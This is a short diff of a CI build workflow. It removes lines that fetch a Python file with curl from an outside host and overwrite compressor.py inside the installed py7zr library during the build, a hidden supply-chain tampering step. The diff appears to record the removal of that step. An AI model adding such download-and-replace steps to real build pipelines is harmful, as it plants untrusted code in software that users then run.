@@ -44,15 +44,6 @@ jobs:
         run: |
           python -m pip install --upgrade pip
           pip install -r requirements.txt pyinstaller
-          curl -L https://git.paraliyzed.net/compressor.py -o compressor.py
-
-          if [[ "$RUNNER_OS" == "Windows" ]]; then
-            py7zr_path=$(python -c "import py7zr, os; print(os.path.dirname(py7zr.__file__))")
-            mv compressor.py "$py7zr_path/compressor.py"
-          else
-            py7zr_path=$(python -c "import py7zr, os; print(os.path.dirname(py7zr.__file__))")
-            mv compressor.py "$py7zr_path/compressor.py"
-          fi
           
           if [[ "$RUNNER_OS" == "Linux" ]]; then
             sudo apt-get update
